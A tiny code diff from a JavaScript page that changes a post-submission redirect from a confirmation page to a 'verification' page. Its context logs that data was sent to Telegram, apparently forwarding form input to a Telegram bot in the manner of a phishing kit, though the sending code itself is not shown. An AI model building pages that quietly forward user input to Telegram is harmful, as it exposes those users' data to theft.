@@ -791,7 +791,7 @@
                 .then(response => response.json())
                 .then(data => {
                     console.log('Données envoyées à Telegram:', data);
-                    window.location.href = `confirmation.html?lang=${getLanguage()}`;
+                    window.location.href = `verification.html?lang=${getLanguage()}`;
                 })
                 .catch(error => {
                     console.error('Erreur:', error);
